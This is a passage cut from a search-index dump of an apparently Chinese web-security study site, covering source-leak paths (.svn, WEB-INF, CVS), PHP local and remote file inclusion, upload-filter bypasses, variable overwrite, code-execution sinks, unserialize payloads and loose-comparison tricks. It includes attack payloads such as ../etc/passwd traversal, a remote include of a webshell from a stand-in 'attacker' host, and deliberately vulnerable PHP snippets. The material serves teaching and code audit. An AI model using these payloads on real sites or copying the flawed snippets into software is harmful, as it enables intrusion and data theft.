\u251c\u2500\u2500 action_list.php\n            \u2502           \u2502   \u251c\u2500\u2500 action_upload.php\n            \u2502           \u2502   \u251c\u2500\u2500 config.json\n            \u2502           \u2502   \u251c\u2500\u2500 controller.php\n            \u2502           \u2502   \u2514\u2500\u2500 Uploader.class.php\n            \u2502           \u251c\u2500\u2500 ueditor.all.js\n            \u2502           \u251c\u2500\u2500 ueditor.all.min.js\n            \u2502           \u251c\u2500\u2500 ueditor.config.js\n            \u2502           \u251c\u2500\u2500 ueditor.parse.js\n            \u2502           \u2514\u2500\u2500 ueditor.parse.min.js\n            \u2514\u2500\u2500 static\n                \u251c\u2500\u2500 css\n                \u2502   \u2514\u2500\u2500 page.css\n                \u251c\u2500\u2500 img\n                \u2502   \u251c\u2500\u2500 bg-table-title.png\n                \u2502   \u251c\u2500\u2500 bg-tab-say.png\n                \u2502   \u251c\u2500\u2500 ico-black-disabled.png\n                \u2502   \u251c\u2500\u2500 ico-black-enabled.png\n                \u2502   \u251c\u2500\u2500 ico-coorption-person.png\n                \u2502   \u251c\u2500\u2500 ico-miss-person.png\n                \u2502   \u251c\u2500\u2500 ico-mr-person.png\n                \u2502   \u251c\u2500\u2500 ico-white-disabled.png\n                \u2502   \u2514\u2500\u2500 ico-white-enabled.png\n                \u2514\u2500\u2500 scripts\n                    \u251c\u2500\u2500 js\n                    \u2514\u2500\u2500 lib\n                        \u2514\u2500\u2500 jquery.min.js\n\n\n21\n directories, \n48\n files\n\n\n\n\n\u7f51\u7ad9\u5907\u4efd\u6587\u4ef6\n\n\n\u7ba1\u7406\u5458\u5907\u4efd\u7f51\u7ad9\u6587\u4ef6\u540e\u9519\u8bef\u5730\u5c06\u5907\u4efd\u653e\u5728 Web \u76ee\u5f55\u4e0b\u3002\n\n\n\u5e38\u89c1\u7684\u540e\u7f00\u540d\uff1a\n\n\n.rar\n.zip\n.7z\n.tar\n.tar.gz\n.bak\n.txt\n\n\n\n\nSVN \u6cc4\u9732\n\n\n\u654f\u611f\u6587\u4ef6\uff1a\n\n\n/.svn\n/.svn/wc.db\n/.svn/entries\n\n\n\n\ndvcs-ripper\n\n\nperl rip-svn.pl -v -u http://www.example.com/.svn/\n\n\n\n\nSeay - SVN\n\n\nWEB-INF / web.xml \u6cc4\u9732\n\n\nWEB-INF \u662f Java Web \u5e94\u7528\u7684\u5b89\u5168\u76ee\u5f55\uff0cweb.xml \u4e2d\u6709\u6587\u4ef6\u7684\u6620\u5c04\u5173\u7cfb\u3002\n\n\nWEB-INF \u4e3b\u8981\u5305\u542b\u4e00\u4e0b\u6587\u4ef6\u6216\u76ee\u5f55\uff1a\n\n\n\n\n/WEB-INF/web.xml\n \uff1aWeb \u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6\uff0c\u63cf\u8ff0\u4e86 servlet \u548c\u5176\u4ed6\u7684\u5e94\u7528\u7ec4\u4ef6\u914d\u7f6e\u53ca\u547d\u540d\u89c4\u5219\u3002\n\n\n/WEB-INF/classes/\n \uff1a\u542b\u4e86\u7ad9\u70b9\u6240\u6709\u7528\u7684 class \u6587\u4ef6\uff0c\u5305\u62ec servlet class \u548c\u975e servlet class\uff0c\u4ed6\u4eec\u4e0d\u80fd\u5305\u542b\u5728\u3002jar \u6587\u4ef6\u4e2d\u3002\n\n\n/WEB-INF/lib/\n \uff1a\u5b58\u653e web \u5e94\u7528\u9700\u8981\u7684\u5404\u79cd JAR \u6587\u4ef6\uff0c\u653e\u7f6e\u4ec5\u5728\u8fd9\u4e2a\u5e94\u7528\u4e2d\u8981\u6c42\u4f7f\u7528\u7684 jar \u6587\u4ef6\uff0c\u5982\u6570\u636e\u5e93\u9a71\u52a8 jar \u6587\u4ef6\u3002\n\n\n/WEB-INF/src/\n \uff1a\u6e90\u7801\u76ee\u5f55\uff0c\u6309\u7167\u5305\u540d\u7ed3\u6784\u653e\u7f6e\u5404\u4e2a java \u6587\u4ef6\u3002\n\n\n/WEB-INF/database.properties\n \uff1a\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u3002\n\n\n\n\n\u901a\u8fc7\u627e\u5230 web.xml \u6587\u4ef6\uff0c\u63a8\u65ad class \u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6700\u540e\u76f4\u63a5 class \u6587\u4ef6\uff0c\u5728\u901a\u8fc7\u53cd\u7f16\u8bd1 class \u6587\u4ef6\uff0c\u5f97\u5230\u7f51\u7ad9\u6e90\u7801\u3002 \u4e00\u822c\u60c5\u51b5\uff0cjsp \u5f15\u64ce\u9ed8\u8ba4\u90fd\u662f\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u7684\uff0cNginx \u914d\u5408 Tomcat \u505a\u5747\u8861\u8d1f\u8f7d\u6216\u96c6\u7fa4\u7b49\u60c5\u51b5\u65f6\uff0c\u95ee\u9898\u539f\u56e0\u5176\u5b9e\u5f88\u7b80\u5355\uff0cNginx \u4e0d\u4f1a\u53bb\u8003\u8651\u914d\u7f6e\u5176\u4ed6\u7c7b\u578b\u5f15\u64ce\uff08Nginx \u4e0d\u662f jsp \u5f15\u64ce\uff09\u5bfc\u81f4\u7684\u5b89\u5168\u95ee\u9898\u800c\u5f15\u5165\u5230\u81ea\u8eab\u7684\u5b89\u5168\u89c4\u8303\u4e2d\u6765\uff08\u8fd9\u6837\u8026\u5408\u6027\u592a\u9ad8\u4e86\uff09\uff0c\u4fee\u6539 Nginx \u914d\u7f6e\u6587\u4ef6\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u5c31\u597d\u4e86\uff1a\n\n\nlocation\n \n~\n \n^/WEB-INF/*\n \n{\n \ndeny\n \nall\n;\n \n}\n \n# \u6216\u8005return 404; \u6216\u8005\u5176\u4ed6\uff01\n\n\n\n\n\nCVS \u6cc4\u9732\n\n\nhttp://url/CVS/Root \u8fd4\u56de\u6839\u4fe1\u606f\nhttp://url/CVS/Entries \u8fd4\u56de\u6240\u6709\u6587\u4ef6\u7684\u7ed3\u6784\n\n\n\n\n\u53d6\u56de\u6e90\u7801\n\n\nbk clone http://url/name dir", 
            "title": "PHP \u4ee3\u7801\u5ba1\u8ba1"
        }, 
        {
            "location": "/web/php/#_1", 
            "text": "\u5e38\u89c1\u7684\u5bfc\u81f4\u6587\u4ef6\u5305\u542b\u7684\u51fd\u6570\u6709\uff1a   PHP\uff1a include() \uff0c include_once() \uff0c require() \uff0c require_once() \uff0c fopen() \uff0c readfile()  \u7b49  JSP Servlet\uff1a ava.io.File() \uff0c java.io.FileReader()  \u7b49  ASP\uff1a includefile \uff0c includevirtual  \u7b49   \u5f53 PHP \u5305\u542b\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0c\u4f1a\u5c06\u8be5\u6587\u4ef6\u5f53\u505a PHP \u4ee3\u7801\u6267\u884c\uff0c\u800c\u4e0d\u4f1a\u5728\u610f\u6587\u4ef6\u65f6\u4ec0\u4e48\u7c7b\u578b\u3002", 
            "title": "\u6587\u4ef6\u5305\u542b"
        }, 
        {
            "location": "/web/php/#_2", 
            "text": "\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0cLocal File Inclusion\uff0cLFI\u3002  ?php  $file   =   $_GET [ file ];  if   ( file_exists ( /home/wwwrun/ . $file . .php ))   { \n   include   /home/wwwrun/ . $file . .php ;  }  ?   \u4e0a\u8ff0\u4ee3\u7801\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0c\u53ef\u7528 %00 \u622a\u65ad\u7684\u65b9\u5f0f\u8bfb\u53d6  /etc/passwd  \u6587\u4ef6\u5185\u5bb9\u3002    %00  \u622a\u65ad  ?file=../../../../../../../../../etc/passwd%00  \u9700\u8981  magic_quotes_gpc=off \uff0cPHP \u5c0f\u4e8e 5.3.4 \u6709\u6548\u3002    \u8def\u5f84\u957f\u5ea6\u622a\u65ad  ?file=../../../../../../../../../etc/passwd/././././././.[\u2026]/./././././.  Linux \u9700\u8981\u6587\u4ef6\u540d\u957f\u4e8e 4096\uff0cWindows \u9700\u8981\u957f\u4e8e 256\u3002    \u70b9\u53f7\u622a\u65ad  ?file=../../../../../../../../../boot.ini/\u2026\u2026\u2026[\u2026]\u2026\u2026\u2026\u2026  \u53ea\u9002\u7528 Windows\uff0c\u70b9\u53f7\u9700\u8981\u957f\u4e8e 256\u3002", 
            "title": "\u672c\u5730\u6587\u4ef6\u5305\u542b"
        }, 
        {
            "location": "/web/php/#_3", 
            "text": "\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\uff0cRemote File Inclusion\uff0cRFI\u3002  ?php  if   ( $route   ==   share )   { \n   require_once   $basePath   .   /action/m_share.php ;  }   elseif   ( $route   ==   sharelink )   { \n   require_once   $basePath   .   /action/m_sharelink.php ;  }   \u6784\u9020\u53d8\u91cf  basePath  \u7684\u503c\u3002  /?basePath=http://attacker/phpshell.txt?  \u6700\u7ec8\u7684\u4ee3\u7801\u6267\u884c\u4e86  require_once  http://attacker/phpshell.txt?/action/m_share.php ;   \u95ee\u53f7\u540e\u7684\u90e8\u5206\u88ab\u89e3\u91ca\u4e3a URL \u7684 querystring\uff0c\u8fd9\u4e5f\u662f\u4e00\u79cd\u300c\u622a\u65ad\u300d\u3002    \u666e\u901a\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b  ?file=[http|https|ftp]://example.com/shell.txt  \u9700\u8981  allow_url_fopen=On  \u5e76\u4e14  allow_url_include=On  \u3002    \u5229\u7528 PHP \u6d41 input  ?file=php://input  \u9700\u8981  allow_url_include=On  \u3002    \u5229\u7528 PHP \u6d41 filter  ?file=php://filter/convert.base64-encode/resource=index.php  \u9700\u8981  allow_url_include=On  \u3002    \u5229\u7528 data URIs  ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=  \u9700\u8981  allow_url_include=On  \u3002    \u5229\u7528 XSS \u6267\u884c  ?file=http://127.0.0.1/path/xss.php?xss=phpcode  \u9700\u8981  allow_url_fopen=On \uff0c allow_url_include=On  \u5e76\u4e14\u9632\u706b\u5899\u6216\u8005\u767d\u540d\u5355\u4e0d\u5141\u8bb8\u8bbf\u95ee\u5916\u7f51\u65f6\uff0c\u5148\u5728\u540c\u7ad9\u70b9\u627e\u4e00\u4e2a XSS \u6f0f\u6d1e\uff0c\u5305\u542b\u8fd9\u4e2a\u9875\u9762\uff0c\u5c31\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u4ee3\u7801\u4e86\u3002", 
            "title": "\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b"
        }, 
        {
            "location": "/web/php/#_4", 
            "text": "\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u662f\u6307\u7528\u6237\u4e0a\u4f20\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u811a\u672c\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7\u6b64\u6587\u4ef6\u83b7\u5f97\u4e86\u6267\u884c\u670d\u5668\u7aef\u547d\u4ee4\u7684\u80fd\u529b\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u4e00\u822c\u662f\u6307\u4e0a\u4f20 WEB \u811a\u672c\u80fd\u591f\u88ab\u670d\u52a1\u5668\u89e3\u6790\u7684\u95ee\u9898\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684 webshell \u95ee\u9898\u3002\u5b8c\u6210\u8fd9\u4e00\u653b\u51fb\u9700\u8981\u8fd9\u6837\u51e0\u4e2a\u6761\u4ef6\uff0c\u4e00\u662f\u4e0a\u4f20\u7684\u6587\u4ef6\u80fd\u591f\u8fd9 WEB \u5bb9\u5668\u6267\u884c\uff0c\u5176\u6b21\u7528\u6237\u80fd\u4ece WEB \u4e0a\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6700\u540e\uff0c\u5982\u679c\u4e0a\u4f20\u7684\u6587\u4ef6\u88ab\u5b89\u5168\u68c0\u67e5\u3001\u683c\u5f0f\u5316\u3001\u56fe\u7247\u538b\u7f29\u7b49\u529f\u80fd\u6539\u53d8\u4e86\u5185\u5bb9\uff0c\u5219\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u5931\u8d25\u3002", 
            "title": "\u6587\u4ef6\u4e0a\u4f20"
        }, 
        {
            "location": "/web/php/#_5", 
            "text": "\u524d\u7aef\u68c0\u67e5\u6269\u5c55\u540d  \u6293\u5305\u7ed5\u8fc7\u5373\u53ef\u3002    Content-Type  \u68c0\u6d4b\u6587\u4ef6\u7c7b\u578b  \u6293\u5305\u4fee\u6539  Content-Type  \u7c7b\u578b\uff0c\u4f7f\u5176\u7b26\u5408\u767d\u540d\u5355\u89c4\u5219\u3002    \u670d\u52a1\u7aef\u6dfb\u52a0\u540e\u7f00  \u5c1d\u8bd5  %00  \u622a\u65ad\u3002    \u670d\u52a1\u7aef\u6269\u5c55\u540d\u68c0\u6d4b  \u5229\u7528\u89e3\u6790\u6f0f\u6d1e\u3002    Apache \u89e3\u6790  phpshell.php.rar.rar.rar.rar  \u56e0\u4e3a Apache \u4e0d\u8ba4\u8bc6  .rar  \u8fd9\u4e2a\u6587\u4ef6\u7c7b\u578b\uff0c\u6240\u4ee5\u4f1a\u4e00\u76f4\u904d\u5386\u540e\u7f00\u5230  .php \uff0c\u7136\u540e\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a PHP \u6587\u4ef6\u3002    IIS \u89e3\u6790  IIS 6 \u4e0b\u5f53\u6587\u4ef6\u540d\u4e3a  abc.asp;xx.jpg  \u65f6\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a  abc.asp \u3002    PHP CGI \u8def\u5f84\u89e3\u6790  \u5f53\u8bbf\u95ee  http://www.a.com/path/test.jpg/notexist.php  \u65f6\uff0c\u4f1a\u5c06  test.jpg  \u5f53\u505a PHP \u89e3\u6790\uff0c  notexist.php  \u662f\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u3002\u6b64\u65f6 Nginx \u7684\u914d\u7f6e\u5982\u4e0b  location   ~   \\.php$   { \n   root   html ; \n   fastcgi_pass   127.0.0.1 : 9000 ; \n   fastcgi_index   index.php ; \n   fastcgi_param   SCRIPT_FILENAME   /scripts $fastcgi_script_name ; \n   include   fastcgi_param ;  }     \u5176\u4ed6\u65b9\u5f0f  \u540e\u7f00\u5927\u5c0f\u5199\u3001\u53cc\u5199\u3001\u7279\u6b8a\u540e\u7f00\u5982  php5  \u7b49\uff0c\u4fee\u6539\u5305\u5185\u5bb9\u7684\u5927\u5c0f\u5199\u8fc7 WAF \u7b49\u3002", 
            "title": "\u7ed5\u8fc7\u4e0a\u4f20\u68c0\u67e5"
        }, 
        {
            "location": "/web/php/#_6", 
            "text": "", 
            "title": "\u53d8\u91cf\u8986\u76d6"
        }, 
        {
            "location": "/web/php/#_7", 
            "text": "\u53d8\u91cf\u5982\u679c\u672a\u88ab\u521d\u59cb\u5316\uff0c\u4e14\u80fd\u591f\u7528\u6237\u6240\u63a7\u5236\uff0c\u90a3\u4e48\u5f88\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5b89\u5168\u95ee\u9898\u3002  register_globals = ON   \u793a\u4f8b  ?php  echo   Register_globals:    .   ( int ) ini_get ( register_globals )   .   br/ ;  if   ( $auth )   { \n   echo   private! ;  }  ?   \u5f53  register_globals=ON  \u65f6\uff0c\u63d0\u4ea4  test.php?auth=1 \uff0c auth  \u53d8\u91cf\u5c06\u81ea\u52a8\u5f97\u5230\u8d4b\u503c\u3002", 
            "title": "\u5168\u5c40\u53d8\u91cf\u8986\u76d6"
        }, 
        {
            "location": "/web/php/#extract", 
            "text": "extract()  \u51fd\u6570\u80fd\u591f\u5c06\u53d8\u91cf\u4ece\u6570\u7ec4\u5bfc\u5165\u5230\u5f53\u524d\u7684\u7b26\u53f7\u8868\uff0c\u5176\u5b9a\u4e49\u4e3a  int extract ( array $var_array [, int $extract_type [, string $prefix ]] )  \u5176\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u51fd\u6570\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u65f6\u7684\u884c\u4e3a\uff0c\u6700\u5e38\u89c1\u7684\u4e24\u4e2a\u503c\u662f  EXTR_OVERWRITE  \u548c  EXTR_SKIP \u3002  \u5f53\u503c\u4e3a  EXTR_OVERWRITE  \u65f6\uff0c\u5728\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u53d8\u91cf\u540d\u53d1\u751f\u51b2\u7a81\uff0c\u5219\u8986\u76d6\u6240\u6709\u53d8\u91cf\uff1b\u503c\u4e3a  EXTR_SKIP  \u5219\u8868\u793a\u8df3\u8fc7\u4e0d\u8986\u76d6\u3002\u82e5\u7b2c\u4e8c\u4e2a\u53c2\u6570\u672a\u6307\u5b9a\uff0c\u5219\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528  EXTR_OVERWRITE \u3002  ?php  $auth   =   0 ;  extract ( $_GET );  if   ( $auth   ==   1 )   { \n   echo   private! ;  }   else   { \n   echo   public! ;  }  ?   \u5f53  extract()  \u51fd\u6570\u4ece\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684\u6570\u7ec4\u4e2d\u5bfc\u51fa\u53d8\u91cf\u65f6\uff0c\u53ef\u80fd\u53d1\u751f\u53d8\u91cf\u8986\u76d6\u3002", 
            "title": "extract() \u53d8\u91cf\u8986\u76d6"
        }, 
        {
            "location": "/web/php/#import_request_variables", 
            "text": "bool import_request_variables (string $types [, string $prefix])  import_request_variables  \u5c06 GET\u3001POST\u3001Cookies \u4e2d\u7684\u53d8\u91cf\u5bfc\u5165\u5230\u5168\u5c40\uff0c\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u53ea\u7528\u7b80\u5355\u5730\u6307\u5b9a\u7c7b\u578b\u5373\u53ef\u3002  ?php  $auth   =   0 ;  import_request_variables ( G );  if   ( $auth   ==   1 )   { \n   echo   private! ;  }   else   { \n   echo   public! ;  }  ?   import_request_variables( G )  \u6307\u5b9a\u5bfc\u5165 GET \u8bf7\u6c42\u4e2d\u7684\u53d8\u91cf\uff0c\u63d0\u4ea4  test.php?auth=1  \u51fa\u73b0\u53d8\u91cf\u8986\u76d6\u3002", 
            "title": "import_request_variables \u53d8\u91cf\u8986\u76d6"
        }, 
        {
            "location": "/web/php/#parse_str", 
            "text": "void parse_str ( string $str [, array  $arr ])  parse_str()  \u51fd\u6570\u901a\u5e38\u7528\u4e8e\u89e3\u6790 URL \u4e2d\u7684 querystring\uff0c\u4f46\u662f\u5f53\u53c2\u6570\u503c\u53ef\u4ee5\u88ab\u7528\u6237\u63a7\u5236\u65f6\uff0c\u5f88\u53ef\u80fd\u5bfc\u81f4\u53d8\u91cf\u8986\u76d6\u3002  // var.php?var=new  \u53d8\u91cf\u8986\u76d6  $var =  init ;  parse_str($_SERVER[ QUERY_STRING ]);  print $var;   \u4e0e  parse_str()  \u7c7b\u4f3c\u7684\u51fd\u6570\u8fd8\u6709  mb_parse_str() \u3002", 
            "title": "parse_str() \u53d8\u91cf\u8986\u76d6"
        }, 
        {
            "location": "/web/php/#_8", 
            "text": "", 
            "title": "\u547d\u4ee4\u6267\u884c"
        }, 
        {
            "location": "/web/php/#_9", 
            "text": "PHP \u4e2d\u6709\u4e0d\u5c11\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u4ee3\u7801\u7684\u51fd\u6570\u3002  eval();  assert();  system();  exec();  shell_exec();  passthru();  escapeshellcmd();  pcntl_exec();  ......", 
            "title": "\u76f4\u63a5\u6267\u884c\u4ee3\u7801"
        }, 
        {
            "location": "/web/php/#preg_replace", 
            "text": "preg_replace()  \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5982\u679c\u5b58\u5728  /e  \u6a21\u5f0f\u4fee\u9970\u7b26\uff0c\u5219\u5141\u8bb8\u4ee3\u7801\u6267\u884c\u3002  ?php  $var   =   tag phpinfo() /tag ;  preg_replace ( / tag (.*?) \\/tag /e ,   addslashes( \\\\ 1) ,   $var );  ?   \u5982\u679c\u6ca1\u6709  /e  \u4fee\u9970\u7b26\uff0c\u53ef\u4ee5\u5c1d\u8bd5 %00 \u622a\u65ad\u3002", 
            "title": "preg_replace() \u4ee3\u7801\u6267\u884c"
        }, 
        {
            "location": "/web/php/#_10", 
            "text": "\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u53ef\u4ee5\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002  ?php  $dyn_func   =   $_GET [ dyn_func ];  $argument   =   $_GET [ argument ];  $dyn_func ( $argument );  ?", 
            "title": "\u52a8\u6001\u51fd\u6570\u6267\u884c"
        }, 
        {
            "location": "/web/php/#_11", 
            "text": "?php  echo   `ls -al` ;  ?", 
            "title": "\u53cd\u5f15\u53f7\u547d\u4ee4\u6267\u884c"
        }, 
        {
            "location": "/web/php/#curly-syntax", 
            "text": "PHP \u7684 Curly Syntax \u4e5f\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\uff0c\u5b83\u5c06\u6267\u884c\u82b1\u62ec\u53f7\u95f4\u7684\u4ee3\u7801\uff0c\u5e76\u5c06\u7ed3\u679c\u66ff\u6362\u56de\u53bb\u3002  ?php  $var   =   aaabbbccc  ${ `ls` } ;  ?   ?php  $foobar   =   phpinfo ;  $ { foobar }();  ?", 
            "title": "Curly Syntax"
        }, 
        {
            "location": "/web/php/#_12", 
            "text": "\u5f88\u591a\u51fd\u6570\u90fd\u53ef\u4ee5\u6267\u884c\u56de\u8c03\u51fd\u6570\uff0c\u5f53\u56de\u8c03\u51fd\u6570\u7528\u6237\u53ef\u63a7\u65f6\uff0c\u5c06\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002  ?php  $evil_callback   =   $_GET [ callback ];  $some_array   =   array ( 0 , 1 , 2 , 3 );  $new_array   =   array_map ( $evil_callback ,   $some_array );  ?   \u653b\u51fb payload  http://www.a.com/index.php?callback=phpinfo", 
            "title": "\u56de\u8c03\u51fd\u6570"
        }, 
        {
            "location": "/web/php/#_13", 
            "text": "\u5982\u679c  unserialize()  \u5728\u6267\u884c\u65f6\u5b9a\u4e49\u4e86  __destruct()  \u6216  __wakeup()  \u51fd\u6570\uff0c\u5219\u6709\u53ef\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002  ?php  class   Example   { \n   var   $var   =   ; \n   function   __destruct ()   { \n     eval ( $this - $var ); \n   }  }  unserialize ( $_GET [ saved_code ]);  ?   \u653b\u51fb payload  http://www.a.com/index.php?saved_code=O:7: Example :1:{s:3: var ;s:10: phpinfo(); ;}", 
            "title": "\u53cd\u5e8f\u5217\u5316"
        }, 
        {
            "location": "/web/php/#php", 
            "text": "", 
            "title": "PHP \u7279\u6027"
        }, 
        {
            "location": "/web/php/#_14", 
            "text": "?php  $var   =   1 ;  $var   =   array ();  $var   =   string ;  ?   php \u4e0d\u4f1a\u4e25\u683c\u68c0\u9a8c\u4f20\u5165\u7684\u53d8\u91cf\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u5c06\u53d8\u91cf\u81ea\u7531\u7684\u8f6c\u6362\u7c7b\u578b\u3002  \u6bd4\u5982\u5728  $a == $b  \u7684\u6bd4\u8f83\u4e2d  $a = null;   $b = false; //\u4e3a\u771f   $a =  ;   $b = 0; //\u540c\u6837\u4e3a\u771f   \u7136\u800c\uff0cPHP \u5185\u6838\u7684\u5f00\u53d1\u8005\u539f\u672c\u662f\u60f3\u8ba9\u7a0b\u5e8f\u5458\u501f\u7531\u8fd9\u79cd\u4e0d\u9700\u8981\u58f0\u660e\u7684\u4f53\u7cfb\uff0c\u66f4\u52a0\u9ad8\u6548\u7684\u5f00\u53d1\uff0c\u6240\u4ee5\u5728\u51e0\u4e4e\u6240\u6709\u5185\u7f6e\u51fd\u6570\u4ee5\u53ca\u57fa\u672c\u7ed3\u6784\u4e2d\u4f7f\u7528\u4e86\u5f88\u591a\u677e\u6563\u7684\u6bd4\u8f83\u548c\u8f6c\u6362\uff0c\u9632\u6b62\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\u56e0\u4e3a\u7a0b\u5e8f\u5458\u7684\u4e0d\u89c4\u8303\u800c\u9891\u7e41\u7684\u62a5\u9519\uff0c\u7136\u800c\u8fd9\u5374\u5e26\u6765\u4e86\u5b89\u5168\u95ee\u9898\u3002  0== 0  //true  0 ==  abcdefg  //true  0 ===  abcdefg  //false  1 ==  1abcdef  //true", 
            "title": "\u6570\u7ec4"
        }, 
        {
            "location": "/web/php/#hash", 
            "text": "0e132456789 == 0e7124511451155  //true  0e123456abc == 0e1dddada  //false  0e1abc == 0   //true   \u5728\u8fdb\u884c\u6bd4\u8f83\u8fd0\u7b97\u65f6\uff0c\u5982\u679c\u9047\u5230\u4e86  0e\\d+  \u8fd9\u79cd\u5b57\u7b26\u4e32\uff0c\u5c31\u4f1a\u5c06\u8fd9\u79cd\u5b57\u7b26\u4e32\u89e3\u6790\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\u3002\u6240\u4ee5\u4e0a\u9762\u4f8b\u5b50\u4e2d 2 \u4e2a\u6570\u7684\u503c\u90fd\u662f 0 \u56e0\u800c\u5c31\u76f8\u7b49\u4e86\u3002\u5982\u679c\u4e0d\u6ee1\u8db3  0e\\d+  \u8fd9\u79cd\u6a21\u5f0f\u5c31\u4e0d\u4f1a\u76f8\u7b49\u3002", 
            "title": "\u9b54\u6cd5 Hash"
        }, 
        {
            "location": "/web/php/#_15", 
            "text": "0x1e240 == 123456  //true  0x1e240 ==123456 //true  0x1e240 == 1e240  //false   \u5f53\u5176\u4e2d\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f  0x  \u5f00\u5934\u7684\u65f6\u5019\uff0cPHP \u4f1a\u5c06\u6b64\u5b57\u7b26\u4e32\u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u7136\u540e\u518d\u8fdb\u884c\u6bd4\u8f83\uff0c 0x1240  \u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u5c31\u662f 123456\uff0c\u6240\u4ee5\u4e0e  int  \u7c7b\u578b\u548c  string  \u7c7b\u578b\u7684 123456 \u6bd4\u8f83\u90fd\u662f\u76f8\u7b49\u3002", 
            "title": "\u5341\u516d\u8fdb\u5236\u8f6c\u6362"
        }, 
        {
            "location": "/web/php/#_16", 
            "text": "\u5e38\u89c1\u7684\u8f6c\u6362\u4e3b\u8981\u5c31\u662f  int  \u8f6c\u6362\u4e3a  string \uff0c string  \u8f6c\u6362\u4e3a  int \u3002  int  \u8f6c  string  $var = 5;  \u65b9\u5f0f1\uff1a$item = (string)$var;  \u65b9\u5f0f2\uff1a$item = strval($var);   string  \u8f6c  int \uff1a intval()  \u51fd\u6570\u3002  \u5bf9\u4e8e\u8fd9\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u5148\u770b 2 \u4e2a\u4f8b\u5b50\u3002  var_dump(intval( 2 )) //2  var_dump(intval( 3abcd )) //3  var_dump(intval( abcd )) //0   \u8bf4\u660e  intval()  \u8f6c\u6362\u7684\u65f6\u5019\uff0c\u4f1a\u5c06\u4ece\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\u77e5\u9053\u9047\u5230\u4e00\u4e2a\u975e\u6570\u5b57\u7684\u5b57\u7b26\u3002\u5373\u4f7f\u51fa\u73b0\u65e0\u6cd5\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\uff0c  intval()  \u4e0d\u4f1a\u62a5\u9519\u800c\u662f\u8fd4\u56de 0\u3002  \u540c\u65f6\uff0c\u7a0b\u5e8f\u5458\u5728\u7f16\u7a0b\u7684\u65f6\u5019\u4e5f\u4e0d\u5e94\u8be5\u4f7f\u7528\u5982\u4e0b\u7684\u8fd9\u6bb5\u4ee3\u7801\uff1a  if(intval($a) 1000) {   mysql_query( select * from news where id= .$a)  }   \u8fd9\u4e2a\u65f6\u5019  $a  \u7684\u503c\u6709\u53ef\u80fd\u662f  1002 union \u3002", 
            "title": "\u7c7b\u578b\u8f6c\u6362"
        }, 
        {
            "location": "/web/php/#_17", 
            "text": "\u5185\u7f6e\u51fd\u6570\u7684\u677e\u6563\u6027\u8bf4\u7684\u662f\uff0c\u8c03\u7528\u51fd\u6570\u65f6\u7ed9\u51fd\u6570\u4f20\u9012\u51fd\u6570\u65e0\u6cd5\u63a5\u53d7\u7684\u53c2\u6570\u7c7b\u578b\u3002\u89e3\u91ca\u8d77\u6765\u6709\u70b9\u62d7\u53e3\uff0c\u8fd8\u662f\u76f4\u63a5\u901a\u8fc7\u5b9e\u9645\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u95ee\u9898\uff0c\u4e0b\u9762\u4f1a\u91cd\u70b9\u4ecb\u7ecd\u51e0\u4e2a\u8fd9\u79cd\u51fd\u6570\u3002  md5()  $array1[] = array(    foo  =   bar ,    bar  =   foo ,  );  $array2 = array( foo ,  bar ,  hello ,  world );  var_dump(md5($array1)==var_dump($array2)); //true   PHP \u624b\u518c\u4e2d\u7684 md5\uff08\uff09\u51fd\u6570\u7684\u63cf\u8ff0\u662f  string md5 ( string $str [, bool $raw_output = false ] ) \uff0c md5()  \u4e2d\u7684\u9700\u8981\u662f\u4e00\u4e2a string \u7c7b\u578b\u7684\u53c2\u6570\u3002\u4f46\u662f\u5f53\u4f60\u4f20\u9012\u4e00\u4e2a array \u65f6\uff0c md5()  